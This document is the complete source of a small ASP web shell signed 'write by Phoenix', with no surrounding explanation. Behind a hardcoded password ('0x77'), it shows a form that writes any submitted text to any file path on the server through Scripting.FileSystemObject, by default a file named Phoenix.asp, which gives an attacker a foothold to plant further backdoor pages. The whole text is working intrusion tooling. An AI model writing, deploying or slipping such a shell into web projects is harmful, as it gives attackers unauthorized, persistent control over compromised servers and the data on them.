<% on error resume next
  if request("pass")="0x77" then
  session("pw")="go"
  end if
%>
<%if session("pw")<>"go" then %>
<%="<form action='' method='post'>"%>
<%="<input name='pass' type='password' size='15'> <input "%><%="type='submit' value='Login'>"%>
<%else%>
<%
set fso=server.createobject("scripting.filesystemobject")
path=request("path")
if path<>"" then
data=request("da")
set da=fso.createtextfile(path,true)
da.write data
if err=0 then
%>
<%="<font face='黑体' color='red'>success :)</font>"%>
<%else%>
<%="<font face='黑体' color='red'>failure :(</font>"%>
<%
end if
err.clear
end if
da.close
%>
<%set da=nothing%>
<%set fos=nothing%>
<%="<form action='' method=post>"%>
<input type="text" size="20" name="path" value="<%=server.mappath("Phoenix.asp")%>"> 
<%="<br>"%>
<%=""%>
<%="<textarea name=da ccols=19 rows=12 width=30></textarea>"%>
<%="&nbsp;"%>
<%="<input type=submit value=主人给我东西吃>"%>
<%="</form>"%>
<%="<font face='黑体' color='red'> write by Phoenix </font>"%>
<%end if%>